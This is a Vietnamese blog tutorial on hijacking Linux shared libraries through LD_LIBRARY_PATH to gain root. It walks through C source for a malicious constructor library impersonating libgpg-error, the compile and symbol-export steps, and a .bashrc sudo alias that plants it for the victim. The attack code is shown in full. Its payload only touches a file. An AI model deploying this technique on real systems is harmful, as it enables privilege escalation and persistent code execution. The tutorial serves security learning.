![](https://images.viblo.asia/5e4b40c7-b0b1-4c15-bc29-5ea91abe21a8.png)


### 1. Cách thức hoạt động của Share Libraries

Như chúng ta đã biết, các chương trình hoạt động trên Linux có cấu trúc theo một định dạng hoàn toàn khác so với Windows. Nếu như trên Windows nó là **Portable Executable** tức PE file. Thì trên Linux là **Executable and Linkable Format** tức ELF

Các chương trình trên 2 hệ thống này có một số điểm chung, đặc biệt ở cách chúng share code với các ứng dụng khác. Trên Windows share code thường được lưu trữu trên DLL, còn Linux là `Share Libraries`.

Các Libraries trên Linux mang đến nhiều lợi ích về hiệu suất làm việc và đồng thời tiết kiệm không gian lưu trữ. Nó cung cấp một nơi duy nhất để update code đồng thời ảnh hưởng tới nhiều chương trình phụ thuộc. Vì thế, nó là vec-tơ giá trị của Hacker khi tấn công vào hệ thống. Thay đổi shared library có thể thay đổi toàn bộ các chương trình đang sử dụng nó.

Khi một application chạy trên Linux, nó sẽ kiểm tra các Libraries bắt buộc của nó ở một số vị trí - theo thứ tự cụ thể. Khi nó tìm thấy bản sao của Libraries mà nó cần, nó sẽ ngừng tìm kiếm và load module mà nó tìm thấy. Application tìm kiếm các Libraries ở những vị trí sau, theo thứ tự:

1. Các thư mục được liệt kê trong giá trị `RPATH` của chương trình

2. Các thư mục được chỉ định trong `LD_LIBRARY_PATH` environment

3. Các thư mục được liệt kê trong giá trị `RUNPATH` của chương trình
4. Các thư mục được chỉ định trong /etc/ld.so.conf
5. Các thư mục trong thư viện hệ thống /lib , /lib64 , /usr/lib , /usr/lib64 , /usr/local/lib , /usr/local/lib64

Để xem các thư viện của một application ta có thể sử dụng command `ldd`

![](https://images.viblo.asia/1e82275e-9c18-48a5-a652-d53b0961cd08.png)


Với vị trí và thứ tự đã biết, chúng ta có thể chiếm quyền điều khiển Libraries (tương tự DLL Injection) hoặc đặt những  Libraries độc hại ở thứ tự trước khi ứng dụng thực thi để kiểm soát ứng dụng (tương tự DLL Hijacking).

Trước tiên, hãy kiểm tra biến **LD_LIBRARY_PATH** và cách chúng ta có thể sử dụng biến này để ép Application thực thi những  Libraries độc hại (do chúng ta tạo ra)  thay vì sử dụng Libraries gốc.

### 2. Hijacking thông qua LD_LIBRARY_PATH

Khi một application khởi chạy, nó sẽ kiểm tra các Libraries của nó trong một tập hợp các vị trí theo thứ tự. Sau khi kiểm tra các giá trị RPATH bên trong application (bị hardcode) nó sẽ kiểm tra biến `LD_LIBRARY_PATH` . Đặt biến này cho phép Hacker ghi đè hành vi mặc định của application và cho phép họ chèn các Libraries của riêng mình.

Các application  bỏ qua việc gọi RPATH khi nó muốn sử dụng các Libraries với version mới, hay để  kiểm tra tính tương thích của nó với một Libraries cụ thể

> Điều này cho thấy , nếu một chương trình hard code Libraries trong RPATH bị fix cứng thì coi như Nâu Hốp
> 
Ở đây, chúng ta tiến hành tạo một Libraries độc hại, sau đó sử dụng `LD_LIBRARY_PATH` để kiểm soát luồng hoạt động của chương trình, từ đó thực thi mã - nâng cao đặc quyền

Đầu tiên chúng ta tiến hành tạo Libraries độc hại

Tạo file payload.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> 

static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
	setuid(0);
	setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("touch /tmp/pwned.txt");
}
```

> Ở đây ta thấy khi function runmahpayload() của Libraries được khởi chạy, nó sẽ thực thi các command như: `set uid` . `set gid` , `system`

Tiến hành biên dịch theo các bước sau

```bash
gcc -Wall -fPIC -c -o payload.o payload.c
```

* -Wall cung cấp chi tiết hơn các warning khi biên dịch
* -c là flag yêu cầu không link code
* -o là output của chương trình sau khi biên dịch

Tiếp theo, chúng ta sử dụng gcc để cho gcc biết rằng chúng ta đang tạo một Share Libraries 

```bash
gcc -shared -o libpayload.so payload.o
```

![](https://images.viblo.asia/59cd94c5-35a3-448e-bf64-317917b71612.png)

> Một điều cần lưu ý là các Share Libraries có một quy tắc đặt tên riêng. Dạng **lib<libname>.so** hoặc số phiên bản được thêm ở cuối như **lib<libname>.so.1**
   
Bây giờ khi đã sở hữu một Share Libraries độc hại, ta muốn chiếm quyền khiển  Libraries của  một chương trình mà nạn nhân có thể chạy  (đặc biệt với quyền sudo). Đồng thời chúng ta cũng nên nhớ rằng, các Libraries được dùng chung cho nhiều application khác nhau , nên việc Hijacking phải đảm bảo  không gây hiệu ứng "Domino" làm hỏng hệ thống.
    
 Mục tiêu chúng ta nhắm đến ở đây là `top` (`top` là một chương trình Monitoring đơn giản , hoạt động với giao diện dòng lệnh trên Unix/Linux)  . Người dùng với đặc quyền root cũng có thể sử dụng chương trình này !!!
    
 Sử dụng `ldd` để tìm kiếm các Libraries mà công cụ này sử dụng
    
![](https://images.viblo.asia/e3b670c7-c303-4f5d-b5cd-6705e1c5e162.png)

   Ta chú ý tới Libraries 
    

`   libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000)`
  
 Đây là Libraries được sử dụng để report error với tên gọi LibGPG-Error. Nó sẽ được load bởi application nhưng thường sẽ không được call trừ khi chương trình gặp lỗi. Do đó, nó không ảnh hưởng gì tới chức năng hoạt động bình thường của `top` cũng như các application khác.
 Lý tưởng nhất là sau khi chạy các mã thực thi như chúng ta mong muốn, chương trình vẫn hoạt động một cách bình thường
    
 Chúng ta đặt biến `LD_LIBRARY_PATH ` thành thư mục chứa payload, đồng thời đổi tên payload theo đúng tên Libraries của chương trình
    
  ```bash
 export LD_LIBRARY_PATH=/home/linuxvictim/ldlib/
 cp libpayload.so libgpg-error.so.0
  ```

  
  Vậy sau khi chạy lệnh `top`, function **runmahpayload()** sẽ được thực thi !! .
    
   Dĩ nhiên là không đơn giản vậy rồi. Ta gặp lỗi búa xua 🙄
    
    
![](https://images.viblo.asia/6a54d631-5c2f-483b-8d49-6607b14cd9c5.png)
    
Vấn đề ở đây là Libraries gốc có những function mà Libraries độc hại của chúng ta không có. Umm!!! vậy chúng ta phải code lại các function y như file gốc thì điều này mới được giải quyết ~~. 
    
Thực ra mọi việc không cần phức tạp đến như thế ! .Khi chạy các application chỉ check các function theo tên. Tức là cứ có tên function trong đó là được - việc code cụ thể như nào thì chương trình không quan tâm. Vậy mọi chuyện sẽ đơn giản hơn nhiều, chúng ta chỉ cần kiểm tra Function_name của Libraries rồi lấy đó import vào Libraries mới (Libraries cũ thì vẫn còn nguyên trên hệ thống - gọi lúc nào cũng được)
    
   Sử dụng `readelf ` với -s flag để tìm kiếm các function --wide để hiển thị symbols name đầy đủ
    
![](https://images.viblo.asia/ba7a60c5-7dda-4da4-99d5-d0b4412debeb.png)

 Mặc định chúng ta không cần điền hết Function Name của  Libraries cũ vào Libraries độc hại. Đơn giản application check Function name gì thì ra cung cấp Function name đó . Theo như mô tả lỗi phía trên, application cần `GPG_ERROR `
 
  Vậy câu lệnh sẽ là  

```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR
```
![](https://images.viblo.asia/fac76302-6449-4b2f-960d-30fd0b4227e0.png)

  Ở đây ta chỉ cần lấy `giá trị thứ 8` + tiền tố `int` trước mỗi function name. Tiến hành lọc bỏ với command 
    
```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR  | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```

    ![](https://images.viblo.asia/dac10384-b025-4950-81a7-0f0f1d4f32ac.png)

 Ta đã có list Function name cho Libraries độc hại. Tiến hành thêm vào code và biên dịch lại : 
    
  ```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));

 int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
int gpgrt_vbsprintf;
int gpgrt_ungetc;
int gpg_err_init;
int gpgrt_tmpfile;
int gpgrt_fputs_unlocked;
int gpgrt_ftello;
int gpgrt_flockfile;
int gpgrt_get_syscall_clamp;
int gpg_err_code_from_errno;
int gpgrt_clearerr;
int gpg_error_check_version;
int gpgrt_vfprintf;
int gpgrt_opaque_set;
int gpgrt_vasprintf;
int gpgrt_fprintf_unlocked;
int gpgrt_lock_init;
int gpgrt_ftell;
int gpgrt_fseeko;
int gpgrt_syshd;
int gpgrt_check_version;
int gpgrt_setvbuf;
int gpgrt_ftrylockfile;
int gpgrt_lock_destroy;
int gpgrt_fname_set;
int gpgrt_bsprintf;
int _gpgrt_set_std_fd;
int _gpgrt_pending_unlocked;
int gpgrt_fclose_snatch;
int gpgrt_fwrite;
int gpgrt_fseek;
int _gpgrt_get_std_stream;
int gpg_err_code_from_syserror;
int gpgrt_asprintf;
int gpg_err_code_to_errno;
int gpgrt_free;
int gpgrt_syshd_unlocked;
int gpgrt_set_nonblock;
int gpgrt_fread;
int gpgrt_fdopen_nc;
int gpgrt_opaque_get;
int gpgrt_fopenmem;
int gpgrt_lock_unlock;
int gpg_err_deinit;
int gpgrt_b64dec_start;
int gpgrt_b64dec_finish;
int gpgrt_fname_get;
int gpgrt_fpopen;
int gpgrt_fputc;
int gpgrt_snprintf;
int gpgrt_lock_trylock;
int gpgrt_fgetc;
int gpg_strerror;
int gpgrt_fopencookie;
int gpgrt_fileno_unlocked;
int gpgrt_vfprintf_unlocked;
int gpgrt_yield;
int gpgrt_write;
int gpgrt_printf_unlocked;
int gpgrt_fclose;
int gpgrt_fdopen;
int gpgrt_fpopen_nc;
int _gpgrt_getc_underflow;
int gpgrt_set_syscall_clamp;
int gpgrt_fputs;
int gpgrt_vsnprintf;
int gpgrt_fgets;
int gpgrt_write_sanitized;
int gpgrt_fileno;
int gpgrt_set_binary;
int gpgrt_lock_lock;
int gpgrt_write_hexstring;
int gpgrt_getline;
int gpgrt_fopenmem_init;
int gpgrt_printf;
int gpgrt_freopen;
int gpg_strsource;
int gpg_err_set_errno;
int gpgrt_sysopen_nc;
int gpgrt_rewind;
int gpgrt_setbuf;
int gpgrt_ferror_unlocked;
int gpgrt_mopen;
int gpgrt_read_line;
int gpgrt_feof;
int gpgrt_sysopen;
int gpgrt_set_alloc_func;
int gpgrt_funlockfile;
int gpgrt_read;
int gpgrt_fopen;
int _gpgrt_pending;
int gpgrt_clearerr_unlocked;
int gpgrt_get_nonblock;
int gpg_strerror_r;
int gpgrt_b64dec_proc;
int gpgrt_ferror;
int gpgrt_fprintf;
int gpgrt_fflush;
int gpgrt_poll;
  
void runmahpayload() {
	setuid(0);
	setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("touch /tmp/pwned.txt");
}
    
  ```
    
![](https://images.viblo.asia/844aede1-7966-4807-864d-f617fd66a67d.png)

Chương trình đã thực thi đoạn mã chúng ta mong muốn, nhưng cơ bản vẫn gặp một lỗi nhỏ `no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)`
    
Ở đây ta thấy có vẻ như `libgcrypt` đang yêu cầu thông tin version trong Libraries độc hại của ta. 
    
**Ok ~ Like is afternoon** !!!
    
  Chúng ta thực thi lại câu lệnh tìm kiếm bên trên, nhưng không cần thêm tiền tố `int` vào ouput
```
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```
  
 Tiếp theo, chúng ta tạo file **gpg.map** với function **GPG_ERROR_1.0** chứa những function name kia
  
 ```bash
GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
...
gpgrt_fflush;
gpgrt_poll;

};
```
> Cái version 1.0 kia không có tác động trực tiếp nào tới mã khai thác của chúng ta, tuy nhiên cứ đặt giống nhau. Đằng nào cũng không mất gì
>    
Tiến hành biên dịch lại với **gpg.map**
    
```bash
gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 payload.o
export LD_LIBRARY_PATH=/home/linuxvictim/ldlib/
```    
 
    
  Chương trình hoạt động bình thường và thực thi câu lệnh chúng ta đã Injection vào
   

Tuy nhiên tới bước này, chúng ta vẫn chưa làm được  trò trống gì. Vì đơn giản chúng ta đang thực hiện `top` dưới quyền `user`
    
 ![](https://images.viblo.asia/65810c81-3bdd-4453-9e37-f4c9c0258431.jpg)

    
 Để người dùng `sudo` thực thi câu lệnh `top` độc hại. Chúng ta phải can thiệp được vào **.bashrc** ép họ thực hiện những command sau :
  

```bash
 sudo LD_LIBRARY_PATH=/home/user/ldlib
 sudo top
```

Với cấu hình **alias**
```bash
 alias sudo="sudo LD_LIBRARY_PATH=/home/user/ldlib"
```
Như vậy, khi nạn nhân thực thi command `sudo top`.  Lệnh sau sẽ được thực thi 
```bash
system("touch /tmp/pwned.txt");
```